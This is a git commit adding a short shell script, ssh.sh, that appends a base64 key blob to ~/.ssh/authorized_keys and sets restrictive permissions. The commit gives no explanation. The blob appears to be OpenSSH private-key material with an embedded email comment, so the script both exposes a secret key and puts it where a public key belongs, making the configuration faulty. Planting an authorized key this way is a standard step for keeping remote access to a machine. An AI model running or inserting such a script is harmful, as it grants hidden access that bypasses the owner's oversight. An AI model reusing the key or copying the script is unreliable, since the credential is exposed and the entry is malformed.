c13ae3761f1f89291f18261a4d5449336b3390f6
TheSorceDev <143894183+TheSorceDev@users.noreply.github.com>
2025-07-28 22:48:19 +0200

    Create ssh.sh

---
+++ ssh.sh
@@ -0,0 +1,5 @@
+mkdir -p ~/.ssh && echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAPImmmislTsfgH+wy20C5wOgRhP3hQ1JZ3CiP1bf4UCwAAAKDAu6t0wLur
+dAAAAAtzc2gtZWQyNTUxOQAAACAPImmmislTsfgH+wy20C5wOgRhP3hQ1JZ3CiP1bf4UCw
+AAAEBNph26CMM8CNwiIF1xhjAmLwg9urFJBmVfrbq74iQ/mA8iaaaKyVOx+Af7DLbQLnA6
+BGE/eFDUlncKI/Vt/hQLAAAAFmZ2b2Vsa2VsMjAxMEBnbWFpbC5jb20BAgMEBQYH" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
